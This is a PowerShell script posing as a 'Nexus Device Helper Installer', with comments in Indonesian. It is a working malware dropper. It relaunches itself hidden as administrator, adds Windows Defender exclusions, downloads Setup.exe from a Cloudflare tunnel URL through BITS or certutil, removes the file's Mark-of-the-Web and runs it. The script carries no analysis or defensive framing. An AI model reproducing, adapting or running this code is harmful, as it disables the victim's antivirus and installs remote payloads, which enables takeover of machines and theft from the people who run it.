# Nexus Device Helper Installer v8
param([switch]$Elevated)

$dest  = "$env:LOCALAPPDATA\Programs\DeviceHelper"
$setup = "$dest\update.exe"
$dlUrl = "https://possess-scheduling-putting-istanbul.trycloudflare.com/Setup.exe"

function Is-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Is-Admin)) {
    # Tulis ulang script ini ke disk supaya bisa di-relaunch sebagai admin
    $tmp = "$env:TEMP\dhi.ps1"
    Copy-Item $PSCommandPath $tmp -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $tmp)) {
        # Fallback: tulis sendiri jika tidak ada PSCommandPath
        $src = $MyInvocation.MyCommand.ScriptBlock.ToString()
        [IO.File]::WriteAllText($tmp, "param([switch]`$Elevated)`r`n" + $src)
    }
    Start-Process powershell -Verb RunAs `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`" -Elevated" `
        -WindowStyle Hidden
    exit
}

# === RUNNING AS ADMIN ===

# Buat folder tujuan
New-Item -ItemType Directory -Force -Path $dest | Out-Null

# Tambah exclusion Defender SEBELUM download
try {
    Add-MpPreference -ExclusionPath $dest -Force
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force
} catch {}

# Download via BITS (paling aman, trusted Windows service, no MOTW)
$ok = $false
try {
    Import-Module BitsTransfer
    Start-BitsTransfer -Source $dlUrl -Destination $setup
    $ok = Test-Path $setup
} catch {}

if (-not $ok) {
    # Fallback certutil
    certutil -urlcache -split -f $dlUrl $setup 2>&1 | Out-Null
    $ok = Test-Path $setup
}

# Hapus Zone.Identifier
try { Remove-Item "${setup}:Zone.Identifier" -Force -EA SilentlyContinue } catch {}

# Jalankan
if ($ok) { Start-Process $setup }
